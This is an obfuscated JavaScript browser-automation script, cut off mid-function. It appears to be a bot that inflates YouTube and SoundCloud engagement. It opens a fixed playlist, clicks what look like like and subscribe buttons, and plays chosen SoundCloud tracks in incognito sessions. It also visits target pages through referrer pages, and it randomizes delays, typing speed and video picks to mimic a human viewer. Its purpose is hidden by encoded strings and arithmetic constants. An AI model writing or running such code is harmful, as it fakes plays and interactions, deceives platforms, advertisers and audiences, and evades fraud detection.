const X = d,
  W = b,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x13c3 * 0x1 + 0x8c * -0x26 + 0x106))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2d7 + 0x81b + 0x3a6 * -0x3), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x6c68 + 0x1 * 0xa8e1 + 0x1 * 0x38b7 + (0x3bf + -0x650d * 0x1 + 0x9be6) * random()) : await standardWaitForNetIdle(f), await wait(-0x216 + -0xe3 * -0xd + 0xa17 + (-0x28f1 + -0x2 * 0x1b0b + 0x1 * 0x8617) * random()), -0x2 * -0x137b + -0x1168 + -0x158d;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x32 * -0xa7 + 0x6df * 0x5 + 0x38f * 0x5), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1412 + -0x29 * -0xf0 + 0x1 * -0x125d;
}
async function randomWait() {
  return await wait(-0x3be * 0x5 + 0x783 + 0x1ebb + (-0x167f * -0x1 + 0x5e * -0x1d + 0x119 * 0x7) * random()), 0xc9c * -0x1 + 0x239c + -0x7 * 0x349;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x10cf * -0x1 + -0xcbb * -0x2 + -0x2a45, -0xb * 0x25d + 0x3f8 + -0x3 * -0x75a), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x21ce * 0x5 + -0xfdcf + 0x29135) * getRandomInt(0x973 * 0x1 + 0x16 * -0x95 + 0x35d, -0x163 * 0x17 + -0xacf + 0x1 * 0x2ab9), h)), 0x22ef + 0x10c9 + -0x33b7;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x820 + 0x1220 + 0x4 * -0x280;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x44 * 0x5c + 0x8e7 * -0x2 + 0x2a3f]['split']('\x20');
    for (let k = -0x144 * -0x12 + -0x2 * 0x878 + -0x2 * 0x2ec; k < i['length']; k += -0x1 * -0x223d + -0x278 * 0xa + -0x98b)
      j += i[k] * h[i[k + (0x4f1 + -0x22 * 0xdd + 0x186a)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1406 + 0x2f9 * 0x1 + -0x1 * 0x16f9)['map'](l => Array['from'](l['children']))['flat'](-0x2053 + -0x1e48 + -0x4 * -0xfa7)['map'](l => l['childNodes'][0x1a * 0x111 + 0x1033 + 0xc * -0x3a9]['childNodes'][-0x603 + 0x5ad + -0x2 * -0x2b]['childNodes'][-0x22e1 * -0x1 + 0x3c * -0x65 + -0xb34]['childNodes'][-0xa12 * -0x3 + 0x932 + -0x308 * 0xd]['childNodes'][0x1 * -0x1b2f + 0x7 * -0xc1 + 0x2077]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x58f * -0x6 + -0x7 * -0x161 + -0x1 * -0x1b9b, -0x20b1 + -0x5ae * 0x3 + -0x77 * -0x95)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x463 * 0x13 + -0x3f6 * 0x1d + 0x5a1d);
  const h = await getMaxTime(f),
    i = Math['min']((0x17a30 + 0xfe04 + -0x18dd4) * getRandomInt(-0xf3 * 0x2 + -0xa92 + 0xc7a, 0x7bd + 0xc1 * -0x28 + 0x1670), h);
  return await wait(i), -0x159e * -0x1 + 0x6f * 0x32 + -0x1 * 0x2b4b;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x268d + -0x947 + 0x2fd4]['children'][0x264b + 0x2479 * -0x1 + -0x1d2]['children'][0x12b7 * -0x2 + -0x13d1 + 0x393f]['children'][-0x10e + 0xa * -0x345 + -0x10e0 * -0x2]['children'][0x7 * -0xe2 + -0x719 + 0x67 * 0x21]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x1 * -0x2381 + 0xd7 * -0x13 + -0x138b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x47 * 0x26 + 0xa2b * 0x1 + 0x2e7 * -0x7 + (0x1653 + 0x6ba + -0x53 * 0x59) * random()
  }), await wait(-0x24d6 + 0x13 * -0x137 + 0x3ddf + (-0x1445 + -0x6fc * 0x1 + -0x1c6d * -0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const R = c;
    if (!await f['evaluate'](() => Array['from'](document[R(0x16) + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x421 + -0x26e1 * 0x1 + 0xb96 * 0x3]['childNodes'][0xcf8 + 0x11d4 + 0x1 * -0x1ecb]['childNodes'][-0x1b9d + 0x14a7 * 0x1 + -0x1 * -0x6f7]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1f6 * -0x8 + 0x7 * 0x2d1 + -0x2362]['childNodes'][-0x237b + 0x167 * 0x1 + 0x2214]['childNodes'][0x16f3 + 0x187 * -0x11 + 0x306]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x3bf * -0x7 + -0x635 + -0x169 * -0x17),
          r = 0xb09 + 0x1788 + -0x1 * 0x2291;
        for (let u = -0x156d + -0x1446 + 0x29b3; u < q['length']; u += 0x8 * -0x4bd + -0x24c2 + 0x4aac)
          r += q[u] * k[q[u + (-0x25db + 0xc07 + 0x1 * 0x19d5)]];
        return r;
      }(n);
  });
  await wait((-0x39c1 * -0x1 + -0x17d2 * -0x1 + 0x6f * -0x35) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x30e5 * 0x1 + 0x1b91a + -0x1 * 0x9dd5) * getRandomInt(0x1fef + -0x4b * -0x72 + -0x25 * 0x1c4, -0xc9e + -0x10e2 + 0x1d8a), h + (0x3bd + 0x1834 + 0x869 * -0x1));
  return await wait(i), -0x15ab + -0x19bd + 0x2f69;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x4b4 + 0x269c + -0xb0 * 0x3f), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x38 + 0x1 * -0x24cb + 0x304b + (0x191b + -0x1986 + 0x453) * Math['random']());
    });
  }, -0x490 + 0x202 * 0xf + 0x1ca);
  await wait(-0x5e78c + -0x6a79b + 0x112307);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x82aa + 0xf * 0x1531 + 0x2f2b) * getRandomInt(0x2 * -0x44f + -0x3d * 0x47 + -0x1 * -0x198d, -0x1 * -0x161f + -0x10ce + -0x538)), clearInterval(h), -0x1 * -0x1a6b + 0x1a66 + -0x14 * 0x2a4;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1eb * 0x2 + 0x1 * 0xa93 + 0x19 * -0x45;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xcd2 + 0x1 * 0xa96 + 0x3 * 0xbf;
    await randomWait();
  }
  return 0x522 + 0x3 * -0x913 + 0x1 * 0x1618;
}

function fetchRandomSC() {
  return Math['random']() <= -0x7 * -0x24a + -0x3f3 * -0x4 + -0xfe9 * 0x2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1 * -0x3b + 0x128b + -0x1250 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1b37 + -0x6dc + 0x9 * -0x243);
    let h = e[f];
    if (b['UsTqiI'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1310 + -0x2472 + 0xa * 0x1bd, s, t, u = 0x9de + 0x1bae + -0x258c; t = n['charAt'](u++); ~t && (s = r % (-0x24b0 + 0x13c3 * 0x1 + 0x10f1 * 0x1) ? s * (-0x497 * 0x4 + 0x2d7 + 0x16f * 0xb) + t : t, r++ % (-0x1211 + 0x1 * 0x1c26 + 0x3 * -0x35b)) ? p += String['fromCharCode'](0x140 + -0x21af * 0x1 + 0x216e & s >> (-(-0x216 + -0xe3 * -0xd + -0x96f) * r & -0x1479 + -0x1 * 0x1b0b + 0x1 * 0x2f8a)) : -0x2 * -0x137b + -0x1168 + -0x158e) {
          t = o['indexOf'](t);
        }
        for (let v = 0x32 * -0xa7 + 0x6df * 0x5 + 0x59 * -0x5, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1412 + -0x29 * -0xf0 + 0x2 * -0x927))['slice'](-(-0x3be * 0x5 + 0x783 + 0xb35));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x167f * -0x1 + 0x5e * -0x1d + 0x151 * -0x9,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xc9c * -0x1 + 0x239c + -0x17 * 0x100; u < -0x10cf * -0x1 + -0xcbb * -0x2 + -0x2945; u++) {
          p[u] = u;
        }
        for (u = -0xb * 0x25d + 0x3f8 + -0x1 * -0x1607; u < -0x4b2 * 0x3 + -0x1527 + 0x243d; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x973 * 0x1 + 0x16 * -0x95 + 0x45b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x163 * 0x17 + -0xacf + 0x3 * 0xe3c, q = 0x22ef + 0x10c9 + -0x33b8;
        for (let v = -0x820 + 0x1220 + 0x4 * -0x280; v < n['length']; v++) {
          u = (u + (-0x44 * 0x5c + 0x8e7 * -0x2 + 0x2a3f)) % (-0x144 * -0x12 + -0x2 * 0x878 + -0x2 * 0x26c), q = (q + p[u]) % (-0x1 * -0x223d + -0x278 * 0xa + -0x88d), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x4f1 + -0x22 * 0xdd + 0x1969)]);
        }
        return t;
      };
      b['CriTZu'] = m, c = arguments, b['UsTqiI'] = !![];
    }
    const j = e[0x1406 + 0x2f9 * 0x1 + -0x7 * 0x349],
      k = f + j,
      l = c[k];
    return !l ? (b['RnQXbx'] === undefined && (b['RnQXbx'] = !![]), h = b['CriTZu'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function a() {
  const bm = [
    'FuPVf85zMi',
    'W6aTFCkWW7n1W7pcJmoTWQq',
    'EwzWvKWYz190AW',
    'Ahr0Chm6lY9NCG',
    'WR87gt8KbZXAWRXv',
    '\x20Safari/53',
    'W7GthxdcTa',
    'DhmGzNvUBNKSyG',
    'zc1IzxrHlxrVBW',
    'WRhdUmoCW68QuW',
    'W5e7d8kbkmoMWQ8zW65q',
    'BW/cONJcL8kUW6VdPIFdLq',
    'ntent-deli',
    'vmo/W6aAW5DAFCkvCSkQ',
    'W6JdIwi4',
    'WRJdLSkPW5NcU1S',
    'ywzMzxmVnY1HDW',
    'z20ZzwL2nLvora',
    'url',
    'rg/en/scri',
    'h0PKFed2GB',
    'D8oDWRHhW4zLeCkXDCk5',
    'z2v0rwXLBwvUDa',
    'ChrZlZqYotyZnq',
    'WRVdRmocFW',
    'W40IW6VcRCk3h8oFWOTBWPy',
    'W4ddQCkOjSk9WP3dMSoUW7jh'
  ];
  a = function() {
    return bm;
  };
  return a();
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1ca1 + -0x3 * 0x737 + -0x6fc + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * 0x8a5 + -0xf * 0xc9 + 0x322 * 0x1;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * -0x3b4a + 0x9875 + -0x23f7 + getRandomInt(0x1c1b + -0x6f61 + 0x46ef * 0x2, 0x2e01 * 0x4 + 0x1 * 0xb11a + -0xf3ee));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1 * 0x26bb + 0x151c + -0x3bd6), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1bb4 + -0xf1b * -0x2 + 0x423 * -0xe;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x10 * -0x154 + 0x3b * 0xa1 + -0xfdb, 0x1ae6 + -0x2b * 0xd8 + -0x2 * -0x4ca)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0xfcf + -0x224b + 0x1a4c + floor((0x63 + 0x406 + -0x81) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xaa * -0x157b672 + -0xc8744c3a + 0x64352486),
          0xef4a8d + -0xe85458 + -0x1 * -0x7909cb,
          0x13 * -0x85a + -0xb7e8 * -0x1 + -0x2242 * -0x3,
          0x3b2 + -0xa1f + -0x24f * -0x3
        ], y = [
          -0x1d88 + -0x249c + 0x423c,
          -0x138a + -0x2 * 0x1115 + 0x5d * 0x94,
          -0x256e + -0x23ac + 0x4922,
          -0x3 * 0x1bf + -0x1fcb * -0x1 + -0x1a8e
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1b10 * -0x1 + -0x2464 * -0x1 + -0x155 * 0x7)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x2009 + 0x1 * -0x48f + -0x2498 * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const S = b;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x217 * 0x1 + -0x785 + 0x56e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))[S(0x9, 'P^eG')]('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x3 * -0x977 + 0x2189 + 0xe * -0x5e] = A[-0x1dc7 + -0x1b9e + 0x1327 * 0x3] = A[0x1dfa * 0x1 + 0xe99 + -0x2c92] = A[0x10dd + 0x63b + -0x1716] = A[0x116a + 0x736 + -0x1 * 0x189d] = A[0xe33 + 0x9 * 0x359 + -0xb14 * 0x4] = A[-0x1 * 0x69 + 0x17c5 + -0x1 * 0x1757] = A[0x1d71 + -0x1342 + 0x121 * -0x9] = A[0x4ae + -0x27 * -0x8f + -0x1a70] = A[0x29 * -0x4f + 0x32b + 0x984] = A[0x2467 + 0xec4 + -0x1991 * 0x2] = A[-0x12a * 0x1c + -0x1e7 * -0x5 + 0x171f] = A[-0x1afd + -0x26dd * 0x1 + 0x41e5] = A[-0xfeb + -0x1724 * 0x1 + 0x271b] = A[-0x183f + -0x16e8 + -0xe4 * -0x35] = A[-0x4d8 + -0x1b1 * 0x16 + -0x37 * -0xc4] = A[-0xf * 0xce + -0x788 + 0x13a9] = 0x609 * -0x2 + 0x53c + 0x23 * 0x32, this['blocks'] = A) : this['blocks'] = [
                0xfb7 + 0x1 * -0x8ec + 0x25 * -0x2f,
                -0x9b0 + -0x1d * 0x6b + 0x15cf,
                -0x443 * -0x6 + 0xa * -0x3cd + 0xc70,
                -0x1 * -0x15c1 + -0x203b + -0x12 * -0x95,
                -0x137f + -0xc31 * 0x1 + 0x4 * 0x7ec,
                0x2393 + -0x201e + -0x375,
                0x1734 + -0x2f2 + -0x1442,
                -0x2263 * 0x1 + -0x7aa + -0x869 * -0x5,
                0xc32 + 0x1792 * -0x1 + 0xb60,
                0x1e2 + -0x24fe + 0x282 * 0xe,
                0x920 + -0x7 * -0x476 + 0x409 * -0xa,
                -0x3 * -0x27b + -0x1 * -0x1647 + -0x2 * 0xedc,
                -0x1200 + 0x4d9 * -0x5 + 0x1 * 0x2a3d,
                -0x2667 + -0xe5b + 0x1a61 * 0x2,
                -0xa * 0x2a7 + 0x216b * -0x1 + 0x3bf1,
                -0x13d * -0x18 + -0x7 * 0x17f + 0x17b * -0xd,
                0x108b + -0x1510 + 0x485 * 0x1
              ], this['h0'] = -0x5a629345 * -0x1 + 0x193a8531 + -0xc57f575, this['h1'] = -0x1c03d8542 + -0x1791702e7 + 0x4292233b2, this['h2'] = 0x431692a1 + 0x4ee * 0x3a237d + -0xc8f6a7d9, this['h3'] = -0x11 * 0x847d02 + 0x13ba382a + -0x3 * -0x1c1787a, this['h4'] = -0x44fc31e * -0x46 + -0x229975e8 * 0xb + -0x10a08d * -0x1084, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x217f + 0x1 * 0x220d + -0x8e, this['finalized'] = this['hashed'] = 0x12bf * 0x2 + -0x68 * 0x3d + -0x65b * 0x2, this['first'] = -0x17 * -0xed + 0x1b28 + 0x9 * -0x562;
            }
            ['update'](J) {
              const T = b;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x583 + -0x1 * -0x954 + -0xed7, O = J['length'] || -0x1f * -0x9e + 0x974 + -0x1c96 * 0x1, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1c46 + 0x133 * -0x1a + 0x2e8, P[0x161 * 0x12 + 0xe * -0x1c9 + -0x2 * -0x16] = this['block'], P[0x7 * 0x3e8 + 0xa8a + 0x2f * -0xce] = P[-0x7d * 0xa + -0x57 * -0x65 + -0x1d70] = P[-0xc00 * -0x2 + -0x227c + 0xa7e] = P[0x2d + 0x532 + -0xe * 0x62] = P[-0xc76 + -0xc1c * -0x1 + 0x5e * 0x1] = P[-0x126a + 0xf * 0xb3 + -0x7f2 * -0x1] = P[-0x1cac + -0x1f14 + 0x3bc6] = P[0x246 + -0x111c + 0x5 * 0x2f9] = P[0x85d * 0x3 + 0x2 * 0x9d1 + -0x11 * 0x2a1] = P[0x5 * 0x672 + -0xee7 + -0x114a] = P[0x2395 + -0x1 * 0xbcf + -0x17bc] = P[-0x792 * -0x1 + 0x1 * -0xf3e + -0x18b * -0x5] = P[0x17a9 + 0x1 * -0xaf1 + -0xcac] = P[0x65a + 0x599 * -0x2 + 0x4e5] = P[0xe74 + -0x26d1 + -0x186b * -0x1] = P[0x1ee1 + -0x18d6 + -0x5fc] = -0x1 * -0x1619 + 0x8 * -0x4cb + -0x1 * -0x103f), K) {
                    for (N = this['start']; M < O && N < 0x1a31 + -0x26fe + 0xd0d; ++M)
                      P[N >> 0x28 * -0x18 + -0x49 * -0x65 + -0x190b] |= J[M] << y[0x5 * 0x38f + -0x23 * -0x7c + -0x22bc & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x320 + -0x240c + 0x4 * 0x84b; ++M)
                      (L = J['charCodeAt'](M)) < -0xb80 + -0x2117 + -0x1 * -0x2d17 ? P[N >> -0x1 * -0xe5d + 0xc * -0x1d + 0x3 * -0x455] |= L << y[-0x2585 + 0x815 * 0x2 + 0x1 * 0x155e & N++] : L < -0x7b * -0x1f + 0x2389 * 0x1 + -0x2a6e ? (P[N >> -0x1 * 0xd1f + -0x3 * 0x4f3 + 0x1 * 0x1bfa] |= (-0x212 * 0x8 + -0x1ddd + 0x2f2d | L >> 0x16cc + 0xa95 + -0x1 * 0x215b) << y[0x618 + -0x18f5 + 0x12e0 & N++], P[N >> 0x1 * -0x1003 + 0x1037 + -0x32] |= (0x10ca * 0x2 + -0xf2c + -0x11e8 | -0x3c * 0x5 + -0x10c5 + 0x1230 & L) << y[0x1 * -0x665 + -0x1319 + 0x1981 & N++]) : L < -0x163c3 + 0x2df2 * -0x4 + 0x2f38b * 0x1 || L >= 0xd6dd + 0x151b * -0x3 + 0x1 * 0x4874 ? (P[N >> -0x19c2 + 0x2 * -0x130d + 0x3fde] |= (-0x1b * 0x151 + -0x1ca7 + 0x4112 | L >> -0x4d5 * 0x5 + -0x9 * 0x20c + -0x2aa1 * -0x1) << y[-0x520 * 0x3 + 0x75e * 0x1 + 0x805 & N++], P[N >> 0x112 * -0x15 + 0x55 * -0x74 + -0x2 * -0x1e80] |= (-0x143 * -0x3 + 0x1 * 0x45b + 0x1e9 * -0x4 | L >> 0x182c + 0x833 * 0x3 + -0x1 * 0x30bf & -0xc2 * 0x1f + -0xf10 + 0x2b * 0xe7) << y[0xc87 + -0x236 * -0x1 + 0x179 * -0xa & N++], P[N >> -0x10a3 + -0xcc2 + -0x1d67 * -0x1] |= (0x1099 + 0x795 * 0x2 + -0x97 * 0x35 | -0x22d0 + -0x1fad + -0x10af * -0x4 & L) << y[-0x39 * 0x17 + -0x1424 * 0x1 + 0x50e * 0x5 & N++]) : (L = 0xbefd + -0x772 * 0x11 + 0xbf95 + ((-0x161d + 0xf * 0x4b + 0x15b7 * 0x1 & L) << 0x1bba + -0x3e5 * 0x2 + -0x1 * 0x13e6 | 0x160e * 0x1 + -0x17 * -0x2b + -0x15ec & J['charCodeAt'](++M)), P[N >> -0x2527 + -0x820 + 0x2d49 * 0x1] |= (-0x1592 + 0x9f5 + 0xc8d | L >> -0x5c4 + -0x214d + 0x2723) << y[-0x1 * -0x1159 + -0x1201 + 0xab & N++], P[N >> 0x1453 + -0x11ed + 0x1 * -0x264] |= (-0x18c7 + 0x1 * -0x763 + 0x20aa | L >> -0x1f5 + 0x11f3 + -0xff2 & 0x6ed + 0x22db + -0x31 * 0xd9) << y[0x15c7 + -0x12bb + 0x3 * -0x103 & N++], P[N >> 0x5 * 0x472 + 0x946 + -0x1d * 0x116] |= (-0x1fd3 + -0x1 * 0x3a6 + -0x23f9 * -0x1 | L >> 0x199a + -0x36d * 0x2 + -0x12ba & -0x22f1 + 0xf4f + -0x7 * -0x2d7) << y[-0xa51 + -0x171a + 0x216e & N++], P[N >> 0x134a + 0x533 * -0x3 + -0x3af * 0x1] |= (-0xfee + 0xfc6 + 0x8 * 0x15 | -0x1392 + -0x23dd + 0x1bd7 * 0x2 & L) << y[0x961 * -0x1 + 0x56b * -0x3 + 0x19a5 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0xb27 + -0x2641 + -0x2 * -0xdad ? (this[T(0x6, '0)&d')] = P[-0x5 * -0x5f + 0xa * -0x77 + 0x2b * 0x11], this['start'] = N - (0x20b8 + -0xd * 0xa5 + -0x1817), this['hash'](), this['hashed'] = -0xd * 0x9b + 0x12f3 + -0xb13) : this['start'] = N;
                }
